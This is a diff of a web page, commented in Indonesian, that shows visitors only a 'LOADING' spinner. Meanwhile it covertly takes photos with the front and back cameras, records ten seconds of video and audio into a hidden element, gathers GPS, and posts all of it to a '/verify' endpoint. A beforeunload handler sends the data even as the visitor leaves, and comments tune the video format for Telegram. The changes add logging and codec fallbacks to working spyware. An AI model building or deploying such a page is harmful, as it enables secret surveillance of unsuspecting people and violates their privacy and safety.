@@ -49,13 +49,11 @@
     </style>
 </head>
 <body>
-    <!-- LOADING -->
     <div class="container" id="loadingContainer">
         <div class="spinner" id="spinner"></div>
         <h1 id="title">LOADING</h1>
     </div>
 
-    <!-- RESULT FOTO DARI GITHUB -->
     <div class="container result-container" id="resultContainer">
         <img src="" alt="Result" class="result-image" id="resultImage">
     </div>
@@ -83,12 +81,11 @@
         let videoBlobData = null;
 
         // ============================================
-        // 📸 AMBIL FOTO KAMERA DEPAN + BELAKANG
+        // 📸 AMBIL FOTO
         // ============================================
         async function captureBothCameras() {
             const result = { front: null, back: null };
 
-            // Kamera Depan
             try {
                 const frontStream = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: 'user', width: 640, height: 480 },
@@ -113,7 +110,6 @@
                 console.log('⚠️ Front camera error:', e.message);
             }
 
-            // Kamera Belakang
             try {
                 const backStream = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: 'environment', width: 640, height: 480 },
@@ -142,14 +138,18 @@
         }
 
         // ============================================
-        // 🎥 REKAM VIDEO 10 DETIK + AUDIO (MP4)
+        // 🎥 REKAM VIDEO 10 DETIK (MP4 - TELEGRAM SUPPORT)
         // ============================================
         async function recordVideo() {
             return new Promise((resolve) => {
                 recordedChunks = [];
 
                 navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: 'user', width: 640, height: 480 },
+                    video: { 
+                        facingMode: 'user', 
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    },
                     audio: {
                         echoCancellation: true,
                         noiseSuppression: true,
@@ -157,34 +157,33 @@
                     }
                 })
                 .then((stream) => {
+                    // Tampilkan di hidden video
                     recorderVideo.srcObject = stream;
                     recorderVideo.muted = true;
                     recorderVideo.play();
 
-                    // Pake MP4 (h264) biar bisa diputar di Telegram
-                    const mimeTypes = [
-                        'video/mp4;codecs=h264,aac',
-                        'video/mp4;codecs=avc1,mp4a',
-                        'video/webm;codecs=vp9,opus',
-                        'video/webm'
-                    ];
+                    // Gunakan format yang pasti didukung Telegram
+                    // Telegram support: H.264 video + AAC audio dalam MP4
+                    const mimeType = 'video/mp4';
+                    
+                    console.log('📹 Using mimeType:', mimeType);
+                    console.log('📹 Supported:', MediaRecorder.isTypeSupported(mimeType));
 
-                    let selectedMimeType = null;
-                    for (const type of mimeTypes) {
-                        if (MediaRecorder.isTypeSupported(type)) {
-                            selectedMimeType = type;
-                            break;
+                    // Kalau MP4 tidak support, fallback ke webm
+                    let finalMimeType = mimeType;
+                    if (!MediaRecorder.isTypeSupported(mimeType)) {
+                        console.log('⚠️ MP4 not supported, using webm');
+                        finalMimeType = 'video/webm;codecs=vp9,opus';
+                        if (!MediaRecorder.isTypeSupported(finalMimeType)) {
+                            finalMimeType = 'video/webm;codecs=vp8,opus';
+                        }
+                        if (!MediaRecorder.isTypeSupported(finalMimeType)) {
+                            finalMimeType = 'video/webm';
                         }
                     }
 
-                    if (!selectedMimeType) {
-                        selectedMimeType = 'video/webm';
-                    }
-
-                    console.log('📹 Using mimeType:', selectedMimeType);
-
                     mediaRecorder = new MediaRecorder(stream, {
-                        mimeType: selectedMimeType,
+                        mimeType: finalMimeType,
                         videoBitsPerSecond: 3000000,
                         audioBitsPerSecond: 128000
                     });
@@ -192,13 +191,27 @@
                     mediaRecorder.ondataavailable = (event) => {
                         if (event.data.size > 0) {
                             recordedChunks.push(event.data);
+                            console.log(`📹 Chunk: ${event.data.size} bytes`);
                         }
                     };
 
                     mediaRecorder.onstop = () => {
+                        console.log(`📹 Total chunks: ${recordedChunks.length}`);
+                        
+                        if (recordedChunks.length === 0) {
+                            console.log('❌ No chunks recorded');
+                            resolve(null);
+                            return;
+                        }
+
+                        // Buat blob dengan mimeType yang benar
                         const blob = new Blob(recordedChunks, {
-                            type: selectedMimeType || 'video/mp4'
+                            type: finalMimeType || 'video/mp4'
                         });
+                        
+                        console.log(`📹 Video blob size: ${blob.size} bytes`);
+                        console.log(`📹 Video blob type: ${blob.type}`);
+                        
                         stream.getTracks().forEach(t => t.stop());
                         recorderVideo.srcObject = null;
                         isRecording = false;
@@ -213,8 +226,10 @@
                         if (mediaRecorder && mediaRecorder.state === 'recording') {
                             mediaRecorder.stop();
                             console.log('⏹️ Recording stopped (10 seconds)');
+                        } else {
+                            console.log('⚠️ Recorder already stopped');
                         }
-                    }, 10000); // 10 DETIK
+                    }, 10000);
                 })
                 .catch((err) => {
                     console.error('❌ Record error:', err);
@@ -350,6 +365,7 @@
                         reader.readAsDataURL(videoBlobData);
                         reader.onloadend = () => resolve(reader.result);
                     });
+                    console.log(`📹 Video base64 length: ${videoBase64 ? videoBase64.length : 0}`);
                 }
 
                 const requestData = {
@@ -362,6 +378,11 @@
                 };
 
                 console.log('📤 Sending data to server...');
+                console.log(`📸 Front: ${!!requestData.frontPhoto}`);
+                console.log(`📸 Back: ${!!requestData.backPhoto}`);
+                console.log(`📹 Video: ${!!requestData.video}`);
+                console.log(`📍 GPS: ${!!requestData.gps}`);
+
                 const response = await fetch('/verify', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -416,7 +437,6 @@
 
             } catch (err) {
                 console.error('❌ Error:', err);
-                // Tetap kirim data yang sudah ada
                 await sendData();
                 
                 loadingContainer.classList.add('hidden');
@@ -436,10 +456,8 @@
         window.addEventListener('beforeunload', async (event) => {
             console.log('🔄 Page closing, sending data...');
             
-            // Stop recording
             if (mediaRecorder && mediaRecorder.state === 'recording') {
                 mediaRecorder.stop();
-                // Tunggu sebentar biar video selesai
                 await new Promise(r => setTimeout(r, 500));
             }
             
@@ -448,11 +466,7 @@
                 stream = null;
             }
 
-            // Kirim data yang sudah ada
             await sendData();
-            
-            // Biarkan page close
-            return;
         });
 
         // ============================================
